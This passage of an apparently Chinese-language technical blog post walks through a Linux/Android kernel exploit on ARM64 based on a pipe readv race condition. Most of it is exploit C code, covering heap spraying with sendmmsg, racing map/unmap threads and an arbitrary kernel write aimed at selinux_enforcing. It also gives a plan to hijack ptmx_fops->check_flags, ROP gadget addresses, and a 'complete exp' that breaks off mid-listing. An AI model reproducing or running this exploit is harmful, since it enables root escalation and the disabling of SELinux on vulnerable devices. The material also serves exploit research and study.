class="line">    </span><br><span class="line">    <span class="keyword">if</span>((ret = setpriority(PRIO_PROCESS, <span class="number">0</span>, <span class="number">-20</span>)) == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;setpriority()&quot;</span>);        <span class="comment">// setprocesspriority, 设置当前进程的优先级为最高    </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Change process priority to highest: %d\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>* <span class="title">sendmsg_iovec</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_pair</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> sock_a;</span><br><span class="line">    <span class="keyword">int</span> sock_b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_pair</span> <span class="title">sockfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsghdr</span> <span class="title">msg</span> =</span> &#123;&#123; <span class="number">0</span> &#125;, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span> , (<span class="keyword">int</span>*)&amp;sockfd);</span><br><span class="line"></span><br><span class="line">    msg.msg_hdr.msg_iov = sendmsg_iovec;</span><br><span class="line">    msg.msg_hdr.msg_iovlen = IOVEC_NUM;</span><br><span class="line">    msg.msg_hdr.msg_control = sendmsg_iovec;</span><br><span class="line">    msg.msg_hdr.msg_controllen = (IOVEC_NUM * <span class="keyword">sizeof</span>(struct iovec)); <span class="comment">// 都设置上，一次在内核中申请两个 kmalloc-8192</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!stop_send)</span><br><span class="line">    &#123;</span><br><span class="line">        syscall(__NR_sendmmsg, sockfd.sock_a, &amp;msg, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(sockfd.sock_a);</span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">heapspray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">void</span>* retval;</span><br><span class="line">    <span class="keyword">pthread_t</span> msgthreads[SENDTHREADS];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Spraying kernel heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sendmsg_iovec = <span class="built_in">malloc</span>(<span class="number">512</span>*<span class="keyword">sizeof</span>(struct iovec));</span><br><span class="line">    <span class="built_in">memset</span>(sendmsg_iovec, <span class="number">0x0</span>, <span class="number">512</span>*<span class="keyword">sizeof</span>(struct iovec));</span><br><span class="line"></span><br><span class="line">    sendmsg_iovec[(IOVECS / <span class="number">2</span>) + <span class="number">1</span>].iov_base = (<span class="keyword">void</span>*)&amp;overflowcheck;</span><br><span class="line">    sendmsg_iovec[(IOVECS / <span class="number">2</span>) + <span class="number">1</span>].iov_len = <span class="keyword">sizeof</span>(overflowcheck);</span><br><span class="line">    sendmsg_iovec[(IOVECS / <span class="number">2</span>) + <span class="number">2</span>].iov_base = target_addr;</span><br><span class="line">    sendmsg_iovec[(IOVECS / <span class="number">2</span>) + <span class="number">2</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; SENDTHREADS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(pthread_create(&amp;msgthreads[i], <span class="literal">NULL</span>, writemsg, <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;heapspray pthread_create()&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    stop_send = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; SENDTHREADS; i++)</span><br><span class="line">        pthread_join(msgthreads[i], &amp;retval);</span><br><span class="line">    stop_send = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    target_addr = <span class="number">0xffffffc0006eba08</span>;        <span class="comment">// 待写入内核地址，示例是环境中的selinux_enforcing地址</span></span><br><span class="line">    targetval = <span class="number">0x0</span>;          <span class="comment">// 待写入的值</span></span><br><span class="line"></span><br><span class="line">    settings();              </span><br><span class="line"></span><br><span class="line"><span class="comment">// getpipes                        // 创建管道，并将其大小设置为 32*4096，防止读pipe时被阻塞</span></span><br><span class="line">    <span class="keyword">if</span>((ret = pipe(pipe_fd))) err(<span class="number">1</span>, <span class="string">&quot;pipe()&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fcntl(pipe_fd[<span class="number">1</span>], F_SETPIPE_SZ, PIPESZ) != PIPESZ) err(<span class="number">1</span>, <span class="string">&quot;fcntl()&quot;</span>);          </span><br><span class="line"></span><br><span class="line"><span class="comment">// mmap unmap addr</span></span><br><span class="line">    <span class="keyword">if</span>(mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;mmap()&quot;</span>);</span><br><span class="line"><span class="comment">// pipe readv iovec</span></span><br><span class="line">    pipe_iovec = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct iovec) * IOVEC_NUM);</span><br><span class="line">    <span class="built_in">memset</span>(pipe_iovec, <span class="number">0</span>, <span class="keyword">sizeof</span>(pipe_iovec));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r_buf[<span class="number">2</span>];</span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_base = r_buf;           <span class="comment">//just any buffer that is always available</span></span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">long</span>) * <span class="number">2</span>;         <span class="comment">//how many bytes we can arbitrary write</span></span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_base = MMAP_ADDR;</span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_len = ((PAGE_SIZE * <span class="number">2</span>) - pipe_iovec[<span class="number">0</span>].iov_len);          <span class="comment">//we need more than one pipe buf so make a total of 2 pipe bufs (8192 bytes) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// three thread race condition</span></span><br><span class="line">    <span class="keyword">pthread_t</span> mapthread, wthread, rthread;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start map/unmap thread\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;mapthread, <span class="literal">NULL</span>, mapunmap, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;mapunmap pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start write thread\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span>(wbuf) / <span class="keyword">sizeof</span>(targetval)); i++)</span><br><span class="line">        ((<span class="keyword">long</span>*)wbuf)[i] = targetval;</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;wthread, <span class="literal">NULL</span>, writepipe, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;write pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap spray</span></span><br><span class="line">    heapspray();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start read thread\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;rthread, <span class="literal">NULL</span>, readpipe, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;read pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(overflowcheck != MEMMAGIC)</span><br><span class="line">        &#123;</span><br><span class="line">            kill_switch = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    [+] Done\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;     overflowcheck : 0x%llx, sizeof(overflowcheck): %d \n&quot;</span>, overflowcheck, <span class="keyword">sizeof</span>(overflowcheck));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done! test_val: 0x%llx\n&quot;</span>, test_val);</span><br><span class="line"></span><br><span class="line">    pthread_join(mapthread,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// pthread_join(wthread,NULL);            // 有概率会卡住</span></span><br><span class="line">    pthread_join(rthread,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="漏洞利用"   >
          <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1>
      <p>准备用两种方法来做：</p>
<ol>
<li>写 <code>ptmx_fop-&gt;check_flags</code> ，控制流劫持后泄露内核sp信息，然后利用任意地址写写addr limit 和selinux，通过pipe任意读写内核，提权</li>
<li>用KSMA的方法，改页表，将内核镜像重新映射成可写的，然后改 <code>setresuid()</code> 函数，使普通用户可以将自己变成root</li>
</ol>

        <h2 id="ptmx-fop→check-flags"   >
          <a href="#ptmx-fop→check-flags" class="heading-link"><i class="fas fa-link"></i></a><a href="#ptmx-fop→check-flags" class="headerlink" title="ptmx_fop→check_flags"></a>ptmx_fop→check_flags</h2>
      <ol>
<li><p>如何找到 <code>ptmx_fops-&gt;check_flags</code> 的地址？（check_flags第一个参数用户态可控）</p>
<p>通过调用链 <code>sys_fcntl-&gt;do_fcntl-&gt;setfl</code>，结合 bzImage.elf 和源码来确认check_flags 在 ptmx_fops 中的偏移。</p>
<p>本次实验环境中，ptmx_fops 的地址是 0xFFFFFFC0006F0F28，check_flags 的偏移是 0xA8，所以<code>ptmx_fops-&gt;check_flags</code> 的地址为 0xFFFFFFC0006F0FD0。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      v27 = *(__int64 (__fastcall **)(_QWORD))(v26 + <span class="number">0xA8</span>);     </span><br><span class="line">            <span class="comment">// ptmx_fops-&gt;check_flags</span></span><br><span class="line"><span class="keyword">if</span> ( !v27 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)a3 ^ *(_DWORD *)(v9 + <span class="number">64</span>)) &amp; <span class="number">0x2000</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_90;</span><br><span class="line">&#125;</span><br><span class="line">v16 = v27((<span class="keyword">unsigned</span> <span class="keyword">int</span>)a3);      <span class="comment">// a3是用户态传入参数</span></span><br><span class="line"><span class="keyword">if</span> ( v16 )</span><br></pre></td></tr></table></div></figure></li>
<li><p>找一条泄露内核sp的gadget</p>
<p>如下四条gadget均能满足要求</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc00027ad14</span> : ldr x1, [x0, #<span class="number">0x20</span>] ; add x0, x29, #<span class="number">0x50</span> ; blr x1</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc000198d50</span> : ldr x1, [x0, #<span class="number">8</span>] ; cbz x1, #<span class="number">0xffffffc000198d60</span> ; add x0, x29, #<span class="number">0x10</span> ; blr x1</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc000198e20</span> : ldr x1, [x0, #<span class="number">8</span>] ; cbz x1, #<span class="number">0xffffffc000198e30</span> ; add x0, x29, #<span class="number">0x30</span> ; blr x1</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc000211d20</span> : ldr x1, [x21, #<span class="number">0x18</span>] ; add x0, x29, #<span class="number">0x88</span> ; blr x1 ;</span><br></pre></td></tr></table></div></figure>
<p>令 x1 为 check_flags 被调用后的返回地址即 0xFFFFFFC00015EC34，x0中存储当前进程的内核栈地址。由于 w0 非0，将会跳转到 0xFFFFFFC00015EA3C 处继续执行即返回用户态。用户态会得到w0的值，缺点是这是一个 int 类型的返回值，只有低8位。不过影响不大，栈地址的前几位是 <code>0xffffffc0</code>，补上即可。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.kernel:FFFFFFC00015EC2C                 MOV             W0, W22 </span><br><span class="line">.kernel:FFFFFFC00015EC30                 BLR             X1    <span class="comment"># 这里x1是ptmx_fops-&gt;check_flags    </span></span><br><span class="line">.kernel:FFFFFFC00015EC34                 CBNZ            W0, loc_FFFFFFC00015EA3C </span><br><span class="line">.kernel:FFFFFFC00015EC38                 LDR             W0, [X19,<span class="comment">#0x40] </span></span><br></pre></td></tr></table></div></figure>

</li>
</ol>
<p>完整exp如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOVEC_NUM 512</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPESZ (4096 * 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMMAGIC (0xDEADBEEF)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_ADDR ((void*)0x40000000)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_SIZE (PAGE_SIZE * 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SENDTHREADS (500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_START 0xffffffc000000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> kill_switch = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> overflowcheck = MEMMAGIC;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> stop_send = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">char</span> wbuf[<span class="number">4096</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">pipe_iovec</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>* <span class="title">sendmsg_iovec</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_pair</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> sock_a;</span><br><span class="line">    <span class="keyword">int</span> sock_b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_pair</span> <span class="title">sockfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maximize_fd_limit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> ((ret = getrlimit(RLIMIT_NOFILE, &amp;rlim))) err(<span class="number">1</span>, <span class="string">&quot;getrlimit()&quot;</span>);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">    <span class="keyword">if</span>((ret = setrlimit(RLIMIT_NOFILE, &amp;rlim))) err(<span class="number">1</span>, <span class="string">&quot;setrlimit()&quot;</span>);          <span class="comment">// setfdlimit, 将能打开的文件描述数量开到最大</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] set RLIMIT_NOFILE to %d\\n&quot;</span>,rlim.rlim_cur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setprocesspriority</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span>((ret = setpriority(PRIO_PROCESS, <span class="number">0</span>, <span class="number">-20</span>)) == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;setpriority()&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Change process priority to highest: %d\\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">mapunmap</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        munmap(MMAP_ADDR, MMAP_SIZE);</span><br><span class="line">        <span class="keyword">if</span>(mmap(MMAP_ADDR, MMAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="string">&quot;mmap() thread&quot;</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mapunmap exit\\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">writepipe</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], wbuf, <span class="keyword">sizeof</span>(wbuf));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;writepipe exit\\n&quot;</span>);      </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">readpipe</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        readv(pipe_fd[<span class="number">0</span>], pipe_iovec, ((IOVEC_NUM / <span class="number">2</span>) + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;readpipe exit\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsghdr</span> <span 